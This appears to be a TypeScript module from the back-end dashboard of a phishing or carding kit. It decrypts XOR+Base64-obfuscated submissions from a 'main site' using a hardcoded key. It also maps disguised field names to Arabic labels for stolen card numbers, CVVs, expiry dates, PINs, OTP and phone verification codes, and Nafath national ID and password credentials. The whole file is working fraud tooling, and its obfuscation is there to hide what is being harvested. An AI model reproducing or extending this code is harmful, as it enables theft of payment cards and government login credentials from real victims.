// Decryption utilities for admin dashboard
// Automatically decrypts XOR+Base64 encrypted text from main site

const XOR_KEY = "BeCare2024SecureKey!@#"

/**
 * Decrypt XOR+Base64 encrypted text
 */
export function decryptText(encrypted: string): string {
  if (!encrypted) return encrypted
  
  try {
    // Decode Base64
    const decoded = atob(encrypted)
    
    // XOR decrypt
    let decrypted = ""
    for (let i = 0; i < decoded.length; i++) {
      const charCode = decoded.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length)
      decrypted += String.fromCharCode(charCode)
    }
    
    return decrypted
  } catch (error) {
    // If decryption fails, return original (might not be encrypted)
    return encrypted
  }
}

/**
 * Auto-decrypt object fields that might contain encrypted text
 * Checks if a string looks like Base64 and attempts decryption
 */
export function autoDecryptObject<T extends Record<string, any>>(obj: T): T {
  if (!obj || typeof obj !== 'object') return obj
  
  const decrypted = { ...obj }
  
  for (const key in decrypted) {
    const value = decrypted[key]
    
    if (typeof value === 'string' && isLikelyEncrypted(value)) {
      decrypted[key] = decryptText(value) as any
    } else if (typeof value === 'object' && value !== null) {
      decrypted[key] = autoDecryptObject(value)
    }
  }
  
  return decrypted
}

/**
 * Check if a string looks like it might be Base64 encoded
 */
function isLikelyEncrypted(str: string): boolean {
  // Base64 pattern: only contains A-Z, a-z, 0-9, +, /, =
  // And typically longer than 20 chars for encrypted Arabic text
  const base64Pattern = /^[A-Za-z0-9+/]+=*$/
  return str.length > 20 && base64Pattern.test(str)
}

/**
 * Field name mapping: obfuscated → readable
 */
export const FIELD_LABELS: Record<string, string> = {
  // Payment fields
  _v1: "رقم البطاقة",
  _v2: "CVV",
  _v3: "تاريخ الانتهاء",
  _v4: "اسم حامل البطاقة",
  _v5: "كود OTP",
  _v6: "رمز PIN",
  _v7: "كود تحقق الهاتف",
  _v8: "رقم الهوية (نفاذ)",
  _v9: "كلمة المرور (نفاذ)",
}

/**
 * Entry type mapping: obfuscated → readable
 */
export const ENTRY_TYPE_LABELS: Record<string, string> = {
  _t1: "card",
  _t2: "otp",
  _t3: "pin",
  _t4: "phone_info",
  _t5: "phone_otp",
  _t6: "nafad",
}

/**
 * Get readable label for obfuscated field name
 */
export function getFieldLabel(fieldName: string): string {
  return FIELD_LABELS[fieldName] || fieldName
}

/**
 * Get readable entry type from obfuscated type
 */
export function getEntryType(obfuscatedType: string): string {
  return ENTRY_TYPE_LABELS[obfuscatedType] || obfuscatedType
}
